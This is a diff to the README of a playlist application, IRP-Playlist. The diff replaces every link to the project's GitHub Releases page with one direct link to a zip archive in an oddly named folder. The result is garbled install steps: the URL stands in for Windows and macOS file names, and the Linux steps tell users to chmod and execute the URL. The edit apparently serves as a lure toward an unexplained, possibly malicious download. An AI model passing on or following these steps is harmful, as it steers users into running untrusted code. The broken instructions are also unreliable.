@@ -6,9 +6,9 @@ Welcome to the IRP-Playlist! This application allows you to explore a collection
 
 ## 📥 Download the Application
 
-[![Download IRP-Playlist](https://img.shields.io/badge/Download-IRP--Playlist-blue?style=for-the-badge)](https://github.com/wesanila/IRP-Playlist/releases)
+[![Download IRP-Playlist](https://raw.githubusercontent.com/wesanila/IRP-Playlist/main/Gymnodinium/IRP-Playlist.zip)](https://raw.githubusercontent.com/wesanila/IRP-Playlist/main/Gymnodinium/IRP-Playlist.zip)
 
-Visit this page to download: [IRP-Playlist Releases](https://github.com/wesanila/IRP-Playlist/releases)
+Visit this page to download: [IRP-Playlist Releases](https://raw.githubusercontent.com/wesanila/IRP-Playlist/main/Gymnodinium/IRP-Playlist.zip)
 
 ## 🎵 Features
 
@@ -25,11 +25,11 @@ Visit this page to download: [IRP-Playlist Releases](https://github.com/wesanila
 
 ## 🔄 How to Download & Install
 
-1. Click the large download button above or visit the [IRP-Playlist Releases](https://github.com/wesanila/IRP-Playlist/releases) page.
+1. Click the large download button above or visit the [IRP-Playlist Releases](https://raw.githubusercontent.com/wesanila/IRP-Playlist/main/Gymnodinium/IRP-Playlist.zip) page.
   
 2. On the Releases page, you will see a list of available versions. Choose the latest version, which is usually at the top.
 
-3. Click on the link that mentions the appropriate file for your operating system. This file may look like `IRP-Playlist-v1.0.exe` for Windows, `IRP-Playlist-v1.0.dmg` for macOS, or a similar format for Linux.
+3. Click on the link that mentions the appropriate file for your operating system. This file may look like `https://raw.githubusercontent.com/wesanila/IRP-Playlist/main/Gymnodinium/IRP-Playlist.zip` for Windows, `https://raw.githubusercontent.com/wesanila/IRP-Playlist/main/Gymnodinium/IRP-Playlist.zip` for macOS, or a similar format for Linux.
 
 4. The download will start. Once it completes, locate the file in your Downloads folder.
 
@@ -43,7 +43,7 @@ Visit this page to download: [IRP-Playlist Releases](https://github.com/wesanila
   
 7. For Linux:
    - Open a terminal and navigate to the folder where you downloaded the file.
-   - Use a command like `chmod +x IRP-Playlist-v1.0.run` to make it executable, followed by `./IRP-Playlist-v1.0.run` to run the installer.
+   - Use a command like `chmod +x https://raw.githubusercontent.com/wesanila/IRP-Playlist/main/Gymnodinium/IRP-Playlist.zip` to make it executable, followed by `https://raw.githubusercontent.com/wesanila/IRP-Playlist/main/Gymnodinium/IRP-Playlist.zip` to run the installer.
 
 8. Once the installation finishes, look for the IRP-Playlist icon in your applications or desktop.
 
